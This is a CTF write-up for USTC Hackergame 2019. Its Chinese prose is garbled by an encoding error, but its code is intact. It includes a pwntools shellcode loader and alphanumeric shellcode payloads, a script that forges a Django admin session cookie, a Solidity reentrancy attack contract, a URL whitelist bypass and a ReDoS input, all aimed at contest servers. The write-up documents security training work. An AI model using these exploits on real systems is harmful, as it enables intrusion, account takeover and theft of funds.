# ustc-hackergame-2019
## ǩ����
�޸�ҳ��Դ���Լ�js���룬ȥ��disabled��������ʹ��Fiddler�滻��Ȼ��ǿ��ˢ��ҳ��
���ɵ���ύ��ť�õ�flag
## ����ҹ
ͼƬ��qq�г���������ͼ������������ʱ���õ��ֻ�
ֱ��ʹ���Դ����򿪼��ɿ���flag
## ��Ϣ��ȫ 2077
ע�⵽ҳ��Դ����������`If-Unmodified-Since`Ϊ��ǰʱ�䣬�����ص�`Last-Modified`��`Fri, 01 Oct 2077 00:00:00 GMT`����`If-Unmodified-Since`��Ϊ��ֵ���ɻ��flag
## �����ռ�����
### 42
��ĿҪ�����$x^3+y^3+z^3=42$�������⣬ֱ�Ӱٶȵõ���
```
��-80538738812075974��^3+80435758145817515^3+12602123297335631^3=42
```
���뼴�ɵõ�flag
## ��ҳ��ȡ��
�鿴Դ���룬����check_hostnameʱ���@֮ǰ���ַ�ɾ��
```python
def check_hostname(url):
    for i in whitelist_scheme:
        if url.startswith(i):
            url = url[len(i):]  # strip scheme
            url = url[url.find("@") + 1:]  # strip userinfo
            if not url.find("/") == -1:
                url = url[:url.find("/")]  # strip parts after authority
            if not url.find(":") == -1:
                url = url[:url.find(":")]  # strip port
            if url not in whitelist_hostname:
                return (False, "hostname {} not in whitelist".format(url))
            return (True, "ok")
    return (False, "scheme not in whitelist, only {} allowed".format(whitelist_scheme))

```
����`http://web1/flag@example.com`�ύ�����ֲ��ԣ����Ǽ��˸��ʺ�
��`http://web1/flag?@example.com`�õ�flag
## �������ɴ�ð��
�鿴ҳ��Դ���֪��ʹ��WebSocket�������ݴ��䣬�û���ֻ�ܷ���������Ϊ��ǰѡ��
���Է�����������г���ʱ�����Թ������ļ���ͨ������̨`ws.send(-1)����`�����²�˴����ڸ������©����
�������̴���:
```javascript
ws.send(0);ws.send(0);//����["������г�","�������","ȥ������Ѩ"]ѡ��
ws.send(0);ws.send(-3223372036854775807);//ѡ��������г���������ֻ��
ws.send(2);//���������Ѩ
ws.send(0);//�Ի�
ws.send(2);//�õ�flag
```
�˴�ʹ�õĸ�����`MAX_INT64` (`9223372036854775807`)�����λ�ĳ�3��һ�μ�������ɹ������������`2329883889435671600`
##  Happy LUG
??��Punycode������`xn--g28h`�����������������Ϊ
`xn--g28h.hack.ustclug.org`
��ѯ��������txt��¼���ɵõ�flag���ֻ��˿�ʹ��`Network Tools`���в�ѯ��
## ������֤��
��Ŀ˵��Ҫ�ҵ�����ʱ�䳬��һ���������ʽ���鿴Դ�뷢�ֻ��г�������
������ʽ���Ȳ��ܴ���6��ƥ����ı����Ȳ��ܴ���24
����ֱ�Ӱٶ��ҵ��˴�:
[����ж�һ����ʱ�����еġ����ޡ�Java������ʽ](http://ju.outofmemory.cn/entry/82230)
����`(0*)*A`���ַ���`00000000000000000000000`
�ύ�õ�flag
## С������� ELF
IDA�򿪣��鿴α���룺
```c
 __asm
  {
    syscall; LINUX - sys_write
    syscall; LINUX - sys_read
  }
  for ( i = 0; i <= 45; ++i )
  {
    buf[i] += 2 * i;
    buf[i] ^= i;
    buf[i] -= i;
  }
  for ( j = 0; j <= 45; ++j )
  {
    if ( buf[j] != *(&v0 + j) )
      __asm { syscall; LINUX - sys_exit }
  }
  __asm
  {
    syscall; LINUX - sys_write
    syscall; LINUX - sys_exit
  }
}
```
����v0��v45�����ݶΣ���Ҫdump����������ʹ�ýű���
���������ֽⷨ�����ƻ���������ó���flag
```python
data = [0x66,0x6e,0x65,0x6b,0x83,0x4e,0x6d,0x74,0x85,0x7a,0x6f,0x57,0x91,0x73,0x90,0x4f,0x8d,0x7f,0x63,0x36,0x6c,0x6e,0x87,0x69,0xa3,0x6f,0x58,0x73,0x66,0x56,0x93,0x9f,0x69,0x70,0x38,0x76,0x71,0x78,0x6f,0x63,0xc4,0x82,0x84,0xbe,0xbb,0xcd]
for i in range(46):
    x = data[i]
    x += i
    x ^= i
    x -= 2 * i
    print(chr(x),end="")

print("\nbrute")
for i in range(46):
    for x in range(256):
        tmp_x = x
        x += 2 * i
        x ^= i
        x -= i
        if(x==data[i]):
            print(chr(tmp_x),end = "")

```
## Shell������
������`ShellCode`�����⣬ֻҪ�����`ShellCode`������������ͻᱻִ��
### ShellHacker1
64λ����
û���κι��ˣ�ʹ��`pwntools`����`shellcode`�����ͼ���
```py
from pwn import *
context(log_level = 'debug', arch = 'amd64', os = 'linux')
shellcode=asm(shellcraft.sh())
#print(shellcode)
token = ""
#sh = process('chall1')

sh = remote('202.38.93.241',10000)
sh.recvuntil("Please input your token: ")
sh.sendline(token)

sh.send(shellcode)
sh.interactive()
```
### ShellHacker2
32λ���������֪call��ַΪeax
��������Ϊ���ֺʹ�д��ĸ
ʹ��`msfvenom`��shellcode����
�õ�
```py
shellcode="PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIRJSXCXVO6OVOCCBH6OE2BI2NRJTKV8MYM36QHILY8MK0AA"
```
���ͼ���getshell

### ShellHacker3
64λ����
��������Ϊ�ɴ�ӡ�ַ�
ʹ��`[ALPHA3](https://github.com/SkyLined/alpha3)`��shellcode���룺
```
python2 ALPHA3.py x64 ascii mixedcase RAX --input=sc.bin
```
�õ�
```py
shellcode="Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C101k2m0h2r4y5p164y390U050C"
```
���ͼ���getshell

## ��������ҹ
��ѹ��һ����Ƶ��ʹ�ýű���֡��ȡ����0x0Ϊ��ɫ��rgbΪ[0 0 0]����ͼƬ��ȡ����
Ȼ��ƴ��ͼƬ������(����Ϊ`Dejavu Sans Mono`)�����ɵõ�flag

## С U �ļ���
���`0x39`�õ�һ��midi�ļ�(�ļ�ͷ`4D 54 68 64`)��ʹ��`Audacity`�򿪵õ�flag
ע��flag �е��ַ���ȫ��ΪӢ��Сд�ַ���
## �׸���õ���
`com.hackergame.eternalEasterlyWind.data.LoginDataSource`���е�login����
��������Ϊ��
��������������base64���룬Ȼ��Ѹ��ַ�����Сд��ת����`pass1`:`AgfJA2vYz2fTztiWmtL3AxrOzNvUiq==`���жԱ�
һ���������һ���̣�
����`logout`������`rawpassword`��һ���Լ�����������㣬�õ�flag
���Զ�`pass1`���д�Сд��ת�������õ�`hackergame2019withfun!`
���뼴�ɵõ�flag
�������ǰѴ���copy������ֱ�ӵ���`logout`��������ģ�

## ����Ҫ����
>���⿼����Ƕ��� Linux ����֪ʶ�����ա����ܿ��ԣ���������ʹ�����򹤳̵ķ�ʽ��ɡ�
### һ��ʼ�ĳ���
���Ƚ���һ���ļ��У���Ϊ����ִ�еĸ�Ŀ¼����yourhomeΪ����
����ֻ֤�������ĸ�Ŀ¼`/Kitchen /Lavatory /Bedroom /Living_Room]`
Ȼ������
```
chroot /yourhome/ ./IWantAHome-linux
```
Ȼ��Ҫ��`/Bedroom/`�µ�`Microphone`��`Headset`������һ�£��������ӵĽ�����ִ����䣺
```
ln Microphone Headset
```
Ȼ��Ҫ��`/Living_Room`����һ����¼��ǰʱ��(��ʽ`20:15:30`)��`Clock`�ļ�
д���ű�ѭ�����ʱ�䵽���ļ������ն����У�Ȼ����������`IWantAHome-linux`
```
#!/bin/bash
while true
do
date "+%H:%M:%S" > /yourhome/Living_Room/Clock
done
```
Ȼ��Ҫ������`sleep 10 seconds in shell`���������`sleep 10`��ʾ�����������Ҳ����ÿ�ִ���ļ����ɼ��������ַ����ж�
�������sleep����Ŀ¼��ִ��`./sleep 10`����ʾ�Ҳ���`/dev/null`����Ӹ��ļ����Ǳ�����ʾ`fork/exec ./sleep: no such file or directory`
���ֳ��ԣ������ѡ��������
### ��������
ʹ��IDA64�򿪸��ļ�������`IDAGolangHelper`�ű��ָ����������ҵ�`main_main`�������޸�ִ�����̣�ֱ�����flag

## ��й©�Ľ���
��`github`�ҵ��û�`openlug`�����Ŀ�:[https://github.com/openlug/django-common](https://github.com/openlug/django-common)
git clone�������鿴`app/views.py`:
```python
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.decorators import login_required
from django.shortcuts import render, redirect
from django.urls import reverse
from django.views.decorators.csrf import csrf_exempt

name = "Rabbit House ��Ա����ϵͳ"


def index(request):
    if request.method == "GET":
        if request.user.is_authenticated:
            return redirect(reverse("profile"))
        return render(request, 'app/index.html', {
            "name": name
        })
    elif request.method == "POST":
        username = request.POST["username"]
        password = request.POST["password"]
        user = authenticate(request, username=username, password=password)
        if user is not None:
            login(request, user)
            return redirect(reverse("profile"))
        else:
            return redirect(reverse("index"))


@login_required
def profile(request):
    if request.user.username == "admin":
        user_profile = "flag redacted. login as admin on server to get flag."
    else:
        user_profile = "�� admin �û������� flag��"
    return render(request, 'app/profile.html', {
        "name": name,
        "username": request.user,
        "profile": user_profile
    })


def log_out(request):
    logout(request)
    return redirect(reverse("index"))


from django.contrib.auth import models


def update_last_login(sender, user, **kwargs):
    pass


models.update_last_login = update_last_login
```
�ؼ�����`if request.user.username == "admin":`�жϣ�Ҫ�õ�ǰ�û����û���Ϊ`admin`���Ʋ���Cookie��ƭ
��Cookie���н��ܣ�������������ģ��õ�
```js
{'_auth_user_id': '2', '_auth_user_backend': 'django.contrib.auth.backends.ModelBackend', '_auth_user_hash': '0a884f8b987fca1a92c6f93d9042d83eea72d98d'}
```
�鿴DjangoԴ���֪��`_auth_user_backend`Ĭ��ֻ����һ�֣����Կ϶��Ƕ�`_auth_user_id`��`_auth_user_hash`�����滻
ֱ�Ӱ�`_auth_user_id`��Ϊ`1`�����ַ���302��ת������Ӧ�û�Ҫ�ó�admin��`_auth_user_hash`ֵ

Դ���������ݿ��ļ�`db.sqlite3`���鿴����������`pbkdf2_sha256`���ܺ������
`admin`: `pbkdf2_sha256$150000$KkiPe6beZ4MS$UWamIORhxnonmT4yAVnoUxScVzrqDTiE9YrrKFmX3hE=`
`guest`: `pbkdf2_sha256$150000$8GFvEvr58uL6$YWM8Fqu8t/UYcW4iHqxXpkKPMEzlUvxbeHYJI45qBHM=`
�ҵ�����`_auth_user_hash`�Ĵ���(`django.contrib.auth.bast_user.py`)
```python
    def get_session_auth_hash(self):
        """
        Return an HMAC of the password field.
        """
        key_salt = "django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash"
        return salted_hmac(key_salt, self.password).hexdigest()
```
copy���������ü��ܺ���������ɹ�ϣֵ
```python
password = "pbkdf2_sha256$150000$KkiPe6beZ4MS$UWamIORhxnonmT4yAVnoUxScVzrqDTiE9YrrKFmX3hE="
hash1 = salted_hmac("django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash", password).hexdigest()
print(hash1)
```
�õ�`0a884f8b987fca1a92c6f93d9042d83eea72d98d`��ǡ���ǽ��ܳ���`_auth_user_hash`ֵ����֤�㷨�ɹ�
Ȼ���޸�`_auth_user_id`��`_auth_user_hash`����������Cookie��requests.get����
�����ű���������`openlug/`�£���
```python
import sys,os,json,requests,re
os.environ.setdefault('DJANGO_SETTINGS_MODULE','settings')
from django.core import signing
from django.contrib.sessions.backends import signed_cookies
from django.utils.crypto import salted_hmac

# key=None : SECRET_KEY
def decode(s):
    return signing.loads(sess,key=None,salt = "django.contrib.sessions.backends.signed_cookies",max_age=1209600)

def encode(s):
    return signing.dumps(sess,key=None,salt = "django.contrib.sessions.backends.signed_cookies",compress = True)

def requestByCk(ck):
    mcookie = {"sessionid":ck}
    r = requests.get("http://202.38.93.241:10019/profile",cookies = mcookie,allow_redirects=False)
    if(r.status_code == 200):
        rawstr = (r.text)
        username = re.findall(r"��ӭ����(.....)��", rawstr)
        if(username[0] == 'admin'):
            flag = re.findall(r"flag{.*}", rawstr)
            print(flag[0])
    elif(r.status_code == 302):
        print("Wrong Cookie.")
    else:
        print("Error:"+r.status_code) 


sess = ".eJxVjDEOgzAMRe_iGUUQULE7du8ZIid2GtoqkQhMVe8OSAzt-t97_wOO1yW5tersJoErWGh-N8_hpfkA8uT8KCaUvMyTN4diTlrNvYi-b6f7d5C4pr1uGXGI6AnHGLhjsuESqRdqByvYq_JohVDguwH3fzGM:1iKXmf:PfphreMrpv-FPLjjGGKUkcFgc2Q"
sess = decode(sess)
print("decode:")
print(sess)

password = "pbkdf2_sha256$150000$KkiPe6beZ4MS$UWamIORhxnonmT4yAVnoUxScVzrqDTiE9YrrKFmX3hE="
adminHash = salted_hmac("django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash", password).hexdigest()
print(adminHash)

sess["_auth_user_id"] = "1"
sess["_auth_user_hash"] = adminHash
print("changed:")
print(sess)
sess = encode(sess)
print("encode:")
print(sess)
requestByCk(sess)
```

## PowerShell �Թ�
�����Ϸ�������cd����Ŀ¼��find����`PSMaze.dll`��������`opt`�ļ�����
ʹ��`base64`����������õ���������ƽ��з���
������`MazeProvider.GetCellRepr`�����л�Ե�ǰ�ڵ�����жϣ�������յ������sha256���㣬����flag
ͨ��BFS��Dijkstra�㷨�õ��Թ���㵽�յ�����·����Ȼ��cd����Ŀ¼���flag
д��powershell�ű��������ɣ�ʹ��Where-Object���й��ˣ������ظ�·�ߣ�
�ű���
```
Import-Module ./PSMaze.dll

function print_i($i) {
    if($i.X -eq 63){
        if($i.Y -eq 63){
        write-host $i.PSPath -fore green
        write-host $i.Flag -fore red
    }
    }
}

function foreachPath($startFolder, $passDir) {
    $colItems = Get-ChildItem $startFolder | Where-Object { $_.Direction -ne $passDir } | Sort-Object
    foreach ($i in $colItems) {
        print_i $i
        $passDir = getInv $i.PSPath
        foreachPath $i.PSPath $passDir
        }
}

function getInv($path) {
    $direction = split-path $path -Leaf
    if ($direction -eq "Up") {
        return "Down"
    }
    if ($direction -eq "Down") {
        return  "Up"
    }
    if ($direction -eq "Left") {
        return "Right"
    }
    if ($direction -eq "Right") {
        return "Left"
    }
}

foreachPath "Maze:/" "Up"

```

�����
```
PSMaze\Maze::\Down\Right\Down\Right\Down\Right\Down\Down\Down\Right\Down\Right\Down\Right\Right\Down\Right\Down\Right\Down\Left\Down\Left\Left\Left\Left\Left\Down\Down\Right\Down\Left\Left\Down\Left\Down\Down\Down\Down\Down\Down\Down\Right\Down\Left\Down\Right\Right\Down\Down\Left\Down\Left\Down\Down\Down\Right\Up\Right\Down\Right\Down\Right\Up\Right\Right\Up\Up\Right\Up\Up\Right\Up\Right\Up\Up\Right\Up\Right\Up\Up\Right\Down\Down\Right\Down\Down\Down\Down\Down\Right\Right\Down\Down\Down\Down\Right\Right\Down\Left\Down\Down\Left\Down\Down\Down\Left\Down\Down\Down\Down\Down\Left\Left\Down\Left\Down\Left\Down\Left\Down\Left\Down\Down\Left\Left\Left\Down\Down\Down\Right\Down\Down\Right\Up\Right\Down\Right\Right\Right\Down\Right\Down\Down\Right\Up\Right\Down\Right\Up\Right\Right\Down\Down\Right\Down\Right\Down\Down\Right\Right\Right\Up\Right\Right\Right\Up\Right\Right\Right\Right\Up\Left\Up\Up\Up\Up\Right\Right\Right\Up\Right\Right\Right\Right\Right\Down\Down\Down\Left\Down\Right\Down\Right\Right\Up\Up\Right\Right\Down\Down\Right\Up\Right\Up\Right\Up\Right\Right\Down\Down\Right\Right\Right\Right\Up\Left\Up\Right\Right\Down\Right\Right\Right\Right\Down\Down\Down\Down\Right\Down\Right\Right\Up\Right\Right\Right\Down\Left\Down\Right\Right\Down\Right
flag{D0_y0u_1ik3_PSC0r3_n0w_2C6BE488}
```
## �²�����
### flag1
ִ��
```js
web3.eth.getStorageAt("0xE575c9abD35Fa94F1949f7d559056bB66FddEB51",2,console.log)
```
��ȡ��secert��ֵ���ύ���ɵõ�flag
### flag2
`withdraw`����������������©�������칥����Լ��ʹ���Ϊһ������
Ȼ��ʹ�ù�����Լ����`get_flag_2`����������got_flag�ֶε�ֵ���Ӷ����flag
������Լ:
```js
pragma solidity ^0.4.26;

contract JCBank {
    mapping (address => uint) public balance;
    mapping (uint => bool) public got_flag;
    uint128 secret;

    constructor (uint128 init_secret) public {
        secret = init_secret;
    }

    function deposit() public payable {
        balance[msg.sender] += msg.value;
    }

    function withdraw(uint amount) public {
        require(balance[msg.sender] >= amount);
        msg.sender.call.value(amount)();
        balance[msg.sender] -= amount;
    }

    function get_flag_1(uint128 guess) public view returns(string) {
        require(guess == secret);

        bytes memory h = new bytes(32);
        for (uint i = 0; i < 32; i++) {
            uint b = (secret >> (4 * i)) & 0xF;
            if (b < 10) {
                h[31 - i] = byte(b + 48);
            } else {
                h[31 - i] = byte(b + 87);
            }
        }
        return string(abi.encodePacked("flag{", h, "}"));
    }

    function get_flag_2(uint user_id) public {
        require(balance[msg.sender] > 1000000000000 ether);
        got_flag[user_id] = true;
        balance[msg.sender] = 0;
    }
}

contract Battach{
    address target;
    address owner;
    uint256 money;
    JCBank g;
    uint flag = 0;
    
    modifier ownerOnly {
        require(owner == msg.sender);
        _;
    }
    // ���캯����ʼ����Լ�����ߵĵ�ַ
    constructor() payable public{
        target = 0xE575c9abD35Fa94F1949f7d559056bB66FddEB51;
         g = JCBank(target);
        owner = msg.sender;
        money = 1;
    }
 
    function getFlag(uint _user_id) ownerOnly payable{
     g.get_flag_2(_user_id);
    }
   
    //��ʼ������Լ
    function startattach() ownerOnly payable{
        require(msg.value >= 1);
       flag = 0;
       g.deposit.value(money)();
       g.withdraw(money);
    }
    
    
    // ���ٺ�Լ���൱��C++�������
    function stopattach() ownerOnly{
        selfdestruct(owner);
    }
    
    //fallback ����
    function() payable{
        require(flag == 0);
        flag = 1;
        g.withdraw(money);
    }
 
}
```
## û�� BUG �Ľ���ϵͳ
### ��һ��
��λ���жϴ���
```cpp
    for (i = 0; i <= 7; ++i)
        temp_password[i] = ((temp_password[i] | temp_password[i + 1]) & ~(temp_password[i] & temp_password[i + 1]) | i) & ~((temp_password[i] | temp_password[i + 1]) & ~(temp_password[i] & temp_password[i + 1]) & i);
    if(memcmp(temp_password, "\x44\x00\x02\x41\x43\x47\x10\x63\x00", 9)) {
        cout << "Bad guy! Wrong password!" << endl;
        exit(0);
    }
```
��Ե�ǰλ����һλ�������㣬����ѭ����û�в������һ���ַ�00�����ԴӺ���ǰ���Ƽ��ɵõ���һ��flag

## ����ʱ����δ��ɵ���
���˳��Լ�[�ҵĲ���](XhyEax.github.io)

�ü��ⶼ�ǲ�һ���ó�flag������̫���� = =